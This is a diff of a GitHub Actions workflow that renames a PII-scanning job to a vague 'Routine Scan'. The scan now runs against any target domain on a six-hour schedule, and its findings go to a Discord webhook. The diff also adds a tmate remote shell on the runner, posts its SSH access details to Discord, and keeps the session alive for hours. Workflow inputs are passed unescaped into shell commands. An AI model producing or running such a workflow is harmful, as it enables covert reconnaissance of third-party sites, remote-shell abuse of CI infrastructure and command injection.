@@ -1,47 +1,87 @@
-name: Automated PII Scan
+name: Routine Scan
 
 on:
   schedule:
-    # Run every day at midnight
-    - cron: "0 0 * * *"
+    - cron: '0 */6 * * *'
   workflow_dispatch:
-    # Allow manual triggers
     inputs:
-      domain:
-        description: "Domain to scan"
+      target_domain:
+        description: 'Enter Target'
         required: false
+        type: string
+      sleep_duration_hours:
+        description: 'Limit (max: 6hrs)'
+        required: false
+        default: '1'
 
 jobs:
-  pii-scan:
+  scan:
     runs-on: ubuntu-latest
-
+    
     steps:
-      - name: Checkout Repository
+      - name: Checkout repository
         uses: actions/checkout@v3
-
-      - name: Set Up Dependencies
+        
+      - name: Setup
         run: |
           sudo apt-get update
-          sudo apt-get install -y curl file grep findutils coreutils
-          curl -sSfL https://raw.githubusercontent.com/tomnomnom/uro/master/uro > /usr/local/bin/uro
-          chmod +x /usr/local/bin/uro
+          sudo apt-get install -y curl jq tmate openssh-client
+          pip install requests uro
 
-      - name: Verify Dependencies
+      - name: Execute pii.sh Script
         run: |
-          xargs --version
-          curl --version
-          file --version
-          grep --version
+          chmod +x ./pii.sh
+          if [ -n "${{ github.event.inputs.target_domain }}" ]; then
+            ./pii.sh "${{ github.event.inputs.target_domain }}" > output/findings.txt
+          else
+            ./pii.sh > output/findings.txt
+          fi
 
-      - name: Run pii.sh Script
+          if [ -s output/findings.txt ]; then
+            {
+              echo "Timestamp: $(date -u)"
+              [ -n "${{ github.event.inputs.target_domain }}" ] && echo "Target: ${{ github.event.inputs.target_domain }}"
+              echo "---"
+              cat output/findings.txt
+            } > output/report.txt
+            
+            curl -H "Content-Type: multipart/form-data" \
+                 -F "file=@output/report.txt" \
+                 ${{ secrets.DISCORD_WEBHOOK_URL }}
+          else
+            echo "No findings detected."
+          fi
+        env:
+          DISCORD_WEBHOOK_URL: ${{ secrets.DISCORD_WEBHOOK_URL }}
+
+      - name: Setup Tmate Session
         run: |
-          DOMAIN=${{ github.event.inputs.domain || '' }}
-          chmod +x pii.sh
-          ./pii.sh "$DOMAIN"
+          ssh-keygen -t rsa -N "" -f ~/.ssh/id_rsa
+          tmate -S /tmp/tmate.sock new-session -d
+          tmate -S /tmp/tmate.sock wait tmate-ready
+          
+          SSH_CMD=$(tmate -S /tmp/tmate.sock display -p '#{tmate_ssh}')
+          WEB_URL=$(tmate -S /tmp/tmate.sock display -p '#{tmate_web}')
+          
+          curl -H "Content-Type: application/json" \
+            -d "{\"content\": \"🔐 **SSH Access Details**\n\n**SSH Command:** ||\`$SSH_CMD\`||\n**Web URL:** [View Session Here]($WEB_URL)\n\n**Note:** _Session active for ${{ github.event.inputs.sleep_duration_hours }} hour(s)_\"}" \
+            ${{ secrets.DISCORD_WEBHOOK_URL }}
+      
+      - name: Keep Alive
+        run: |
+          SLEEP_DURATION=$(( ${{ github.event.inputs.sleep_duration_hours }} * 3600 ))
+          if [ "$SLEEP_DURATION" -gt 21600 ]; then
+            SLEEP_DURATION=21600
+          fi
+          sleep $SLEEP_DURATION
 
-      - name: Upload Results
-        if: success()
-        uses: actions/upload-artifact@v3
-        with:
-          name: pii-scan-results
-          path: output
+      - name: Cleanup
+        run: |
+          rm -rf output/
+      
+      - name: Notify Failure
+        if: failure()
+        run: |
+          curl -H "Content-Type: application/json" \
+            -d '{"content": "❌ Workflow failed. Check logs for details."}' \
+            ${{ secrets.DISCORD_WEBHOOK_URL }}
